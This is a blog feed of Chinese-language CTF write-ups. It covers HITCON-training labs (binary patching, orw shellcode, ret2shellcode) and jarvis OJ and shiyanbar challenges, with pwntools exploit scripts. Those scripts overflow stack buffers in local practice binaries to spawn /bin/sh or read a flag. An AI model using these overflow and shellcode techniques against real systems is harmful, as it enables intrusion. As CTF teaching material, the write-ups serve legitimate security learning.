    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="Pwn-10月23-Hitcon-一"><a href="#Pwn-10月23-Hitcon-一" class="headerlink" title="Pwn-10月23-Hitcon(一)"></a>Pwn-10月23-Hitcon(一)</h1><blockquote><p>继续二进制修炼，今天开始肝Hiton-training，膜着<a href="https://m4x.fun/post/hitcon-training-writeup/" target="_blank" rel="noopener">m4x</a>，以及另一位大佬<a href="https://www.jianshu.com/p/2cae38284bff" target="_blank" rel="noopener">23R3F</a>的题解蹒跚前行。</p></blockquote><h2 id="lab1-sysmagic"><a href="#lab1-sysmagic" class="headerlink" title="lab1-sysmagic"></a>lab1-sysmagic</h2><blockquote><p>貌似第一题会比较简单，先用IDA-Pro静态分析一下：</p><p><img src="https://i.loli.net/2018/10/23/5bcf0b64c261c.png" alt=""></p><p>貌似直接得到了一个能够输出flag的函数？由于这是个elf32位可执行文件所以我们需要在linux下面执行：</p><p><img src="https://i.loli.net/2018/10/23/5bcf0332abc98.png" alt=""></p><p>可以很简单就看懂逻辑，输入一个值，然后比较如果相等，得出flag。</p></blockquote><h3 id="解法1-patch"><a href="#解法1-patch" class="headerlink" title="解法1 - patch"></a>解法1 - patch</h3><blockquote><p>IDA Pro – keypatch，使用<code>keypatch</code>插件来修改汇编代码，我们可以直接将关键的一步nop掉或者改成完全相反的操作。</p></blockquote><p><img src="https://i.loli.net/2018/10/23/5bcf05f6b8d06.png" alt=""></p><blockquote><p>例如将<code>.text:08048722</code>的跳转汇编指令改为jmp无条件跳转，或者是与jnz相反的jz操作。</p><p><img src="https://i.loli.net/2018/10/23/5bcf075963ea4.png" alt=""></p><p><img src="https://i.loli.net/2018/10/23/5bcf07b5548dc.png" alt=""></p><p>修改为无条件跳转后需要将其保存到对应文件中：<br><img src="https://i.loli.net/2018/10/23/5bcf07f4c58d9.png" alt=""></p><p>然后去把文件挪到linux上运行试试发现并没有用，因为改为jmp后其函数直接少了一部分对flag的操作：</p><p><img src="https://i.loli.net/2018/10/23/5bcf0a2f45481.png" alt=""></p><p>所以我们只能将原样本中的jnz改为jz了，改完之后函数已经成为不等则输出flag了：</p><p><img src="https://i.loli.net/2018/10/23/5bcf0bd4dce1d.png" alt=""></p><p>运行效果：</p><p><img src="https://i.loli.net/2018/10/23/5bcf0c1461b1f.png" alt=""></p></blockquote><h3 id="解法2-gdb-set-register-value"><a href="#解法2-gdb-set-register-value" class="headerlink" title="解法2 - gdb set register value"></a>解法2 - gdb set register value</h3><blockquote><p>通过gdb动态调试，并且在即将进行比较前，将 eax置为与edx相同的值即可：</p><p><img src="https://i.loli.net/2018/10/23/5bcf0e78806d2.png" alt=""></p><p>然后即可得到flag。</p></blockquote><h2 id="lab2-orw"><a href="#lab2-orw" class="headerlink" title="lab2-orw"></a>lab2-orw</h2><h3 id="检查保护措施"><a href="#检查保护措施" class="headerlink" title="检查保护措施"></a>检查保护措施</h3><blockquote><p><code>checksec orw.bin</code>，题目orw的意思是open，read，write这三个函数。</p><p><img src="https://i.loli.net/2018/10/23/5bcf0fca60256.png" alt=""></p><p>emmm这是我做的第一个开启了Stack保护的题目呢。</p></blockquote><h3 id="逻辑分析"><a href="#逻辑分析" class="headerlink" title="逻辑分析"></a>逻辑分析</h3><blockquote><p>简单跑一下可以看到直接是让你输入shellcode：<br><img src="https://i.loli.net/2018/10/23/5bcf104eea350.png" alt=""></p><p>放IDA pro里面看看：</p><p><img src="https://i.loli.net/2018/10/23/5bcf15e2dd0aa.png" alt=""></p><p>细看一下<code>orw_seccomp()函数</code>:</p><p><img src="https://i.loli.net/2018/10/23/5bcf16ed762fb.png" alt=""></p><p>prctl函数又是啥玩意儿？Prctl(用户和内核沟通的一个绝佳函数),这个函数可以对进程进行一些设置。<a href="https://bbs.pediy.com/thread-225488.htm" target="_blank" rel="noopener">而有一道强网杯题目就好像用了这玩意儿的技术？</a></p><p>输入shellcode之后应该会执行，所以这题的目的是让我们自己构造shellcode去读取flag？既然要构造shellcode，那就需要用到pwntools的asm模块和shellcraft模块：</p><p>asm模块是将操作转换为汇编命令，而shellcraft是具有各种函数对应汇编命令的一个模块，十分好用：</p><p><img src="https://i.loli.net/2018/10/23/5bcf1996469a4.png" alt=""></p><p>pwntools中的context模块又是用来干嘛的呢？</p><p><code>context</code>是pwntools用来设置环境的功能。在很多时候，由于二进制文件的情况不同，我们可能需要进行一些环境设置才能够正常运行exp，比如有一些需要进行汇编，但是32的汇编和64的汇编不同，如果不设置context会导致一些问题。</p><p>例如<code>context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;)</code></p><p>这句话的意思是： </p><ol><li>os设置系统为linux系统，在完成ctf题目的时候，大多数pwn题目的系统都是linux </li><li>arch设置架构为amd64，可以简单的认为设置为64位的模式，对应的32位模式是’i386’ </li><li>log_level设置日志输出的等级为debug，这句话在调试的时候一般会设置，这样pwntools会将完整的io过程都打印下来，使得调试更加方便，可以避免在完成CTF题目时出现一些和IO相关的错误。</li></ol></blockquote><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>根据题意和题解😂（正处于涨姿势的时候）写出exp：</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> shellcraft <span class="token keyword">as</span> sccontext<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>shellcode <span class="token operator">=</span> sc<span class="token punctuation">.</span>pushstr<span class="token punctuation">(</span><span class="token string">"/home/xiaoyifeng/ctf/pwn/Hiton/lab2/flag"</span><span class="token punctuation">)</span>shellcode <span class="token operator">+=</span> sc<span class="token punctuation">.</span>open<span class="token punctuation">(</span><span class="token string">"esp"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#  open返回的文件文件描述符存贮在eax寄存器里 </span>shellcode <span class="token operator">+=</span> sc<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token string">"eax"</span><span class="token punctuation">,</span> <span class="token string">"esp"</span><span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#  open读取的内容放在栈顶 </span><span class="token comment" spellcheck="true">#  write函数在栈顶读取0x100大小的内容并打印出来</span>shellcode <span class="token operator">+=</span> sc<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"esp"</span><span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./orw.bin"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#print(asm(shellcode))</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"shellcode:"</span><span class="token punctuation">,</span> asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> io<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>运行效果：</p><p><img src="https://i.loli.net/2018/10/23/5bcf2cbec3db2.png" alt=""></p><h2 id="lab3-ret2sc"><a href="#lab3-ret2sc" class="headerlink" title="lab3-ret2sc"></a>lab3-ret2sc</h2><blockquote><p>题目名是return to shellcode的简写，应该是利用return返回然后执行shellcode之类的操作？</p></blockquote><h3 id="检查保护措施-1"><a href="#检查保护措施-1" class="headerlink" title="检查保护措施"></a>检查保护措施</h3><blockquote><p><code>checksec ret2sc</code></p><p><img src="https://i.loli.net/2018/10/23/5bcf21774fa88.png" alt=""></p><p>emmm没有开启啥保护，没有开启栈溢出检测，也没有开启栈不可执行（NX）。</p></blockquote><h3 id="逻辑分析-1"><a href="#逻辑分析-1" class="headerlink" title="逻辑分析"></a>逻辑分析</h3><blockquote><p>跑一下发现让我们输入字符串到Name里面，还有一个try your best？首先想到的是会不会又是啥栈溢出什么的。</p></blockquote><blockquote><p> <img src="https://i.loli.net/2018/10/23/5bcf212fdd23f.png" alt=""></p></blockquote><blockquote><p>嗯，情况是有的：</p><p><img src="https://i.loli.net/2018/10/23/5bcf22016964b.png" alt=""></p><p>通过gdb动态调试可以发现在输入try your best 的值的时候可以发生溢出，并且将EIP指向我们构造的位置：</p><p><img src="https://i.loli.net/2018/10/23/5bcf25189cf77.png" alt=""></p><p>而这个临界值我们可以通过pattern search来查我们构造的pattern偏移量，得到为32。根据大佬的题解了解到return to shellcode是一种题型，我甚至想到了又用ROP chain???<code>黑人问号.jpg</code>😭。</p><p>原来return to shellcode的操作就是将shellcode写入name变量空间，然后通过返回到该地址从而执行shellcode(NX未开启，栈可执行)</p><p><img src="https://i.loli.net/2018/10/23/5bcf2a86e5630.png" alt=""></p><p>该变量地址为0x804A060</p></blockquote><h3 id="构造EXP"><a href="#构造EXP" class="headerlink" title="构造EXP"></a>构造EXP</h3><blockquote><p>这个exp需要用到shellcraft和asm，来将shellcode转为汇编指令：</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">"linux"</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">"i386"</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span><span class="token punctuation">)</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./ret2sc"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#获得sh的命令多种多样，并且有不同系统版本的sh</span><span class="token comment" spellcheck="true">#shellcode = asm(shellcraft.execve("/bin/sh"))</span>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>i386<span class="token punctuation">.</span>linux<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span> shellcode<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#flat模块能将pattern字符串和地址结合并且转为字节模式</span>payload <span class="token operator">=</span> flat<span class="token punctuation">(</span>cyclic<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x804a060</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>运行效果：</p></blockquote><p><img src="https://i.loli.net/2018/10/23/5bcf2c13d7442.png" alt=""></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>内容涉及 context 模式设置，asm模块，shellcraft模块，patch操作，return to shellcode题型，pwntools flat模块。</p><p>今天先混到这儿。。。我真菜😭。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;Pwn-10月23-Hitcon-一&quot;&gt;&lt;a href=&quot;#Pwn-10月23-Hitcon-一&quot; class=&quot;headerlink&quot; title=&quot;Pwn-10月23-Hitcon(一)&quot;&gt;&lt;/a&gt;Pwn-10月23-Hitcon(一
      
    
    </summary>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/categories/CTF/"/>
    
    
      <category term="Pwn" scheme="http://www.yof3ng.xyz/tags/Pwn/"/>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/tags/CTF/"/>
    
      <category term="二进制安全" scheme="http://www.yof3ng.xyz/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Re-10月22-shiyanbar-10000</title>
    <link href="http://www.yof3ng.xyz/2018/10/22/Re-10%E6%9C%8822-shiyanbar-10000/"/>
    <id>http://www.yof3ng.xyz/2018/10/22/Re-10月22-shiyanbar-10000/</id>
    <published>2018-10-22T06:23:30.000Z</published>
    <updated>2018-10-22T08:58:01.248Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="Re-10月22-shiyanbar-10000"><a href="#Re-10月22-shiyanbar-10000" class="headerlink" title="Re-10月22-shiyanbar-10000"></a>Re-10月22-shiyanbar-10000</h1><blockquote><p>emmm记录一下实验吧里一道简单的逆向，实际上就是一种思维方式。</p></blockquote><blockquote><p>拿到一个exe文件,运行效果如下：</p><p><img src="https://i.loli.net/2018/10/22/5bcd6ebe22927.png" alt=""></p><p>对没错就是一个喵字，然后输入内容，会输出wrong，可以猜测输入了正确的字符后会输出good。</p></blockquote><h2 id="静态分析程序逻辑"><a href="#静态分析程序逻辑" class="headerlink" title="静态分析程序逻辑"></a>静态分析程序逻辑</h2><blockquote><p>令人绝望的是，ida6.8和ida7.0对此程序main函数分析的伪代码居然不同，这里我们看7.0的：</p><p><img src="https://i.loli.net/2018/10/22/5bcd72ad9ac34.png" alt=""></p><p>简单分析可以知道，这里是将我们的输入按字节与0x80u进行或操作，即按位或，然后对处理后的内容进行字符串比较，然后得出结果。上图中的v4到v16实际上都是下图中的16进制转为整型的内容，因为一个字节可以表示的数字范围为-128到127。</p><p><img src="https://i.loli.net/2018/10/22/5bcd71a486530.png" alt=""></p><p>然后我就要傻逼😭地说，这些内容肯定跟比较是有关系的。</p><p>试试将0xe6与0x80</p><p>我们注意到<code>.text:004013F8</code>位置的命令是将eax与0xFFFFFF80相或，为啥我们的伪代码中却是与0x80u相或呢？因为我们是按字节来进行或操作，所以0xFFFFFF80前面的三个字节也就没有了必要。</p><p>唉实在是这题目逻辑太含糊不清（可能是我太菜┭┮﹏┭┮）</p></blockquote><h2 id="动态程序逻辑分析"><a href="#动态程序逻辑分析" class="headerlink" title="动态程序逻辑分析"></a>动态程序逻辑分析</h2><blockquote><p>通过ollydbg我们来进行动态调试，首先载入程序，查找字符串：</p><p><img src="https://i.loli.net/2018/10/22/5bcd7825508d0.png" alt=""></p><p>然后我们找一下”喵”，出现的位置，并且在找到的字符串比较函数下断点：</p><p><img src="https://i.loli.net/2018/10/22/5bcd78b3669b0.png" alt=""></p><p>然后运行，并且随便输入一个字符串：</p><p><img src="https://i.loli.net/2018/10/22/5bcd790b40671.png" alt=""></p><p>栈中出现了两个字符串比较的数据，在数据窗口跟随，可以发现s2为13个字节，正好对应前面的那13个数据</p><p><img src="https://i.loli.net/2018/10/22/5bcd79f764ec2.png" alt=""></p><p>但是光靠这些信息我们能拿到我们想要的答案吗？我们可以对s1进行一些操作，之前输入的字符串为<code>helloword 或操作处理后==&gt; E8 E5 EC EC EF F7 EF F2 E4</code>。我看网上很多教程是直接通过异或，将s2异或0x80得到结果（脑洞？？）</p><p><img src="https://i.loli.net/2018/10/22/5bcd7e34f2571.png" alt=""></p><p>一个字节的情况下，可能通过异或操作并且根据已知条件能够得到或操作的原操作数，但是我可能太菜了不求甚解，只能写个脚本枚举一下flag好了（根据ida根本难以看出来好不好😭还是太菜了不能怪ida)。</p></blockquote><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><blockquote><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token comment" spellcheck="true">#</span>__Author__ <span class="token operator">=</span><span class="token string">"Yof3ng"</span>lists <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0xE6</span><span class="token punctuation">,</span><span class="token number">0xEC</span><span class="token punctuation">,</span><span class="token number">0xE1</span><span class="token punctuation">,</span><span class="token number">0xE7</span><span class="token punctuation">,</span><span class="token number">0xBA</span><span class="token punctuation">,</span><span class="token number">0xF4</span><span class="token punctuation">,</span><span class="token number">0xE5</span><span class="token punctuation">,</span><span class="token number">0xF3</span><span class="token punctuation">,</span><span class="token number">0xF4</span><span class="token punctuation">,</span><span class="token number">0xF4</span><span class="token punctuation">,</span><span class="token number">0xE5</span><span class="token punctuation">,</span><span class="token number">0xF3</span><span class="token punctuation">,</span><span class="token number">0xF4</span><span class="token punctuation">]</span>flag<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">for</span> a <span class="token keyword">in</span> lists<span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> i<span class="token operator">|</span><span class="token number">0x80</span><span class="token operator">==</span>a<span class="token punctuation">:</span>            flag <span class="token operator">+=</span> chr<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></code></pre></blockquote><p>运行效果：</p><p><img src="https://i.loli.net/2018/10/22/5bcd7ed7225ae.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;Re-10月22-shiyanbar-10000&quot;&gt;&lt;a href=&quot;#Re-10月22-shiyanbar-10000&quot; class=&quot;headerlink&quot; title=&quot;Re-10月22-shiyanbar-10000&quot;&gt;&lt;/a&gt;R
      
    
    </summary>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/tags/CTF/"/>
    
      <category term="二进制安全" scheme="http://www.yof3ng.xyz/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
      <category term="RE" scheme="http://www.yof3ng.xyz/tags/RE/"/>
    
  </entry>
  
  <entry>
    <title>Pwn-10月21-jarvis-level0</title>
    <link href="http://www.yof3ng.xyz/2018/10/21/Pwn-10%E6%9C%8821-jarvis-level0/"/>
    <id>http://www.yof3ng.xyz/2018/10/21/Pwn-10月21-jarvis-level0/</id>
    <published>2018-10-21T01:01:10.000Z</published>
    <updated>2018-10-21T01:54:26.067Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="Pwn-10月21-jarvis-level0"><a href="#Pwn-10月21-jarvis-level0" class="headerlink" title="Pwn-10月21-jarvis-level0"></a>Pwn-10月21-jarvis-level0</h1><blockquote><p>这题是补上昨天没写完的一题。。。虽然很简单😭😭</p></blockquote><h2 id="检查保护措施"><a href="#检查保护措施" class="headerlink" title="检查保护措施"></a>检查保护措施</h2><blockquote><p><code>file level0</code> and <code>checksec level0</code>:</p><p><img src="https://i.loli.net/2018/10/21/5bcbd13050ba5.png" alt=""></p><p>可以看到这种简单的pwn题基本不开保护措施，不然菜鸡我也玩不下去。。。</p></blockquote><h2 id="静态分析程序逻辑"><a href="#静态分析程序逻辑" class="headerlink" title="静态分析程序逻辑"></a>静态分析程序逻辑</h2><blockquote><p>一用IDA Pro打开程序文件看看main函数就脑残地看到了<code>return vulnerable_function()</code></p><p><img src="https://i.loli.net/2018/10/21/5bcbd173656cc.png" alt=""></p><p>跟着去这个函数看一看:</p><p><img src="https://i.loli.net/2018/10/21/5bcbd20189ae1.png" alt=""></p><p>可以看到定义的buf空间为0x80,而能够用read函数读取的为0x200，能够造成栈溢出，并且实现函数地址覆盖。而且我们也可以看到一个callsystem函数，点进去看看可以发现<code>system(&quot;/bin/sh&quot;)</code>:</p><p><img src="https://i.loli.net/2018/10/21/5bcbd2752027e.png" alt=""></p><p>那么根据静态分析出来的信息大概可以确定：首先通过main函数返回到vulnerable_function函数，然后通过vulnerable_function函数将某处返回地址覆盖为callsystem函数的地址，然后getshell。</p></blockquote><h2 id="动态分析程序逻辑"><a href="#动态分析程序逻辑" class="headerlink" title="动态分析程序逻辑"></a>动态分析程序逻辑</h2><blockquote><p>gdb 调试一下level0，先单步执行到vulnerable_function()函数：</p><p><img src="https://i.loli.net/2018/10/21/5bcbd5dc96afe.png" alt=""></p><p>先过一遍该函数，然后记录关键信息：</p><p><img src="https://i.loli.net/2018/10/21/5bcbd6954fadf.png" alt=""></p><p>计算一下距离：<code>hex(0x7fffffffdfc0 + 8 - 0x7fffffffdf40) = 0x88</code>，那为什么比定义的0x80要多0x08的距离呢？这里我们可以通过ida pro的<code>alt + k</code>快捷键查看buf的栈帧，会发现：</p><p><img src="https://i.loli.net/2018/10/21/5bcbd939b1a8b.png" alt=""></p><p>通过gdb调试里面的多个关键信息对比，其实多出来的0x08是栈底的内容，继续下一步，就可以看到最开始被压入栈中的返回地址被置栈顶，准备返回：</p><p><img src="https://i.loli.net/2018/10/21/5bcbda659d6b6.png" alt=""></p><p>那么我们就可以开始构造exp啦😄。</p></blockquote><h2 id="攻破"><a href="#攻破" class="headerlink" title="攻破"></a>攻破</h2><blockquote><p>通过上面的逻辑我们可以写出如下exp：</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span>Author <span class="token operator">=</span> <span class="token string">"Yof3ng"</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"level0"</span><span class="token punctuation">)</span>callsystem_addr <span class="token operator">=</span> <span class="token number">0x400596</span>padding <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0x80</span> <span class="token operator">+</span> <span class="token number">0x08</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token string">"a"</span>payload <span class="token operator">=</span> padding <span class="token operator">+</span> callsystem_addrio<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></blockquote><p>运行效果：</p><p><img src="https://i.loli.net/2018/10/21/5bcbdc2dbe46c.png" alt=""></p><p>然后就getshell啦😍。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;Pwn-10月21-jarvis-level0&quot;&gt;&lt;a href=&quot;#Pwn-10月21-jarvis-level0&quot; class=&quot;headerlink&quot; title=&quot;Pwn-10月21-jarvis-level0&quot;&gt;&lt;/a&gt;Pwn-
      
    
    </summary>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/categories/CTF/"/>
    
    
      <category term="Pwn" scheme="http://www.yof3ng.xyz/tags/Pwn/"/>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/tags/CTF/"/>
    
      <category term="二进制安全" scheme="http://www.yof3ng.xyz/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Pwn-10月20-one-of-jarvis</title>
    <link href="http://www.yof3ng.xyz/2018/10/20/Pwn-10%E6%9C%8820-two-of-jarvis/"/>
    <id>http://www.yof3ng.xyz/2018/10/20/Pwn-10月20-two-of-jarvis/</id>
    <published>2018-10-20T14:48:18.000Z</published>
    <updated>2018-10-20T16:07:46.818Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="Pwn-10月20-jarvis-Tell-me-something"><a href="#Pwn-10月20-jarvis-Tell-me-something" class="headerlink" title="Pwn-10月20-jarvis-Tell_me_something"></a>Pwn-10月20-jarvis-Tell_me_something</h1><blockquote><p>今天简单地做一下jarvis oj的两道题，<code>level0</code>和<code>Tell_me_something</code>.</p><p>PS:凌晨0:07  明天写level0，其实两题差不多的逻辑，挺简单的。</p></blockquote><h2 id="Tell-me-something"><a href="#Tell-me-something" class="headerlink" title="Tell_me_something"></a>Tell_me_something</h2><h3 id="检查保护措施"><a href="#检查保护措施" class="headerlink" title="检查保护措施"></a>检查保护措施</h3><blockquote><p>首先，<code>file gestbook</code>and<code>checksec guestbook</code>，简单地看看文件信息和保护措施</p><p><img src="https://i.loli.net/2018/10/20/5bcb420ce98b7.png" alt=""></p><p>可以看到它是没有脱衣服的，然后没有开启保护措施。</p></blockquote><h3 id="静态分析程序逻辑"><a href="#静态分析程序逻辑" class="headerlink" title="静态分析程序逻辑"></a>静态分析程序逻辑</h3><blockquote><p>用IDA pro 看一下该程序的汇编代码，可以看到main函数：</p><p><img src="https://i.loli.net/2018/10/20/5bcb42684db9f.png" alt=""></p><p>F5大法，看看伪代码，很简单就可以判断出溢出点，因为read函数可以将超出0x88大小的数据读入栈空间：</p><p><img src="https://i.loli.net/2018/10/20/5bcb42f7dd043.png" alt=""></p><p>然后我们也可以看到good_game函数里面有我们要的关键信息：</p><p><img src="https://i.loli.net/2018/10/20/5bcb498c0b0c9.png" alt=""></p><p>那么到这里基本上可以确定，是通过溢出来使程序跳转到good_game函数从而得到flag。</p></blockquote><h3 id="动态分析程序逻辑"><a href="#动态分析程序逻辑" class="headerlink" title="动态分析程序逻辑"></a>动态分析程序逻辑</h3><blockquote><p>首先放linux里面跑一跑：</p><p><img src="https://i.loli.net/2018/10/20/5bcb48a91dfc9.png" alt=""></p><p>确实产生了溢出的问题，然后这里我们用一下linux平台的一个二进制分析软件，radare2，说实话还是可以用的，这个软件集成了很多工具，并且也可以进行部分地动态调试（<a href="https://xz.aliyun.com/t/1514/#toc-7" target="_blank" rel="noopener">radare2详细教程</a>）：</p><p><img src="https://i.loli.net/2018/10/20/5bcb495987b21.png" alt=""></p><p>接下来我们用gdb调试一下，先构造一个0x88长度的padding输入，再看看栈空间：</p><p><img src="https://i.loli.net/2018/10/20/5bcb4c838d5dd.png" alt=""></p><p>可以知道将长度为0x88的padding填充到栈空间之后，还可以进行覆盖，因为可以读取最大0x100（256）大小的字符，而ebp栈底出界就是一个函数地址，我们可以看看这个函数地址有什么关键性的操作举动：</p><p><img src="https://i.loli.net/2018/10/20/5bcb4d6959622.png" alt=""></p><p>进行单步执行测试查看该溢出点能够被覆盖的地址是否会被返回，先重新查看一下该栈位置存储的函数地址为多少：</p><p><img src="https://i.loli.net/2018/10/20/5bcb4f4e7f83a.png" alt=""></p><p>可以看到存储的函数地址为0x7ffff7a3fa87，到栈位置即将改变时，进行下一步验证：</p><p><img src="https://i.loli.net/2018/10/20/5bcb4e0d8a46d.png" alt=""></p><p>执行下一步：</p><p><img src="https://i.loli.net/2018/10/20/5bcb4e84bc436.png" alt=""></p><p>再下一步就将该函数地址放入了RIP，作为下一步运行的函数指令：<br><img src="https://i.loli.net/2018/10/20/5bcb4ed83e345.png" alt=""></p><p>那么到这里已经明白可以返回该地址覆盖的内容，写exp了。</p></blockquote><h3 id="攻破"><a href="#攻破" class="headerlink" title="攻破"></a>攻破</h3><blockquote><p>用0x88长度的内容做padding，然后将good_game的地址放到尾部，然后执行即可。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token comment" spellcheck="true">#exp.py</span>Author <span class="token operator">=</span> <span class="token string">"Yof3ng"</span><span class="token keyword">from</span> pwn impor <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'guestbook'</span><span class="token punctuation">)</span>good_game_addr <span class="token operator">=</span> <span class="token number">0x400620</span>padding <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x88</span>payload <span class="token operator">=</span> padding <span class="token operator">+</span> p64<span class="token punctuation">(</span>good_game_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token keyword">print</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></blockquote><p>运行结果：</p><p><img src="https://i.loli.net/2018/10/21/5bcb5203a355b.png" alt=""></p><p>啊本来今天打算写两题的博客，看来这篇只能水了，太晚了先睡了。😭😭</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;Pwn-10月20-jarvis-Tell-me-something&quot;&gt;&lt;a href=&quot;#Pwn-10月20-jarvis-Tell-me-something&quot; class=&quot;headerlink&quot; title=&quot;Pwn-10月20-j
      
    
    </summary>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/categories/CTF/"/>
    
    
      <category term="Pwn" scheme="http://www.yof3ng.xyz/tags/Pwn/"/>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/tags/CTF/"/>
    
      <category term="二进制安全" scheme="http://www.yof3ng.xyz/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
</feed>
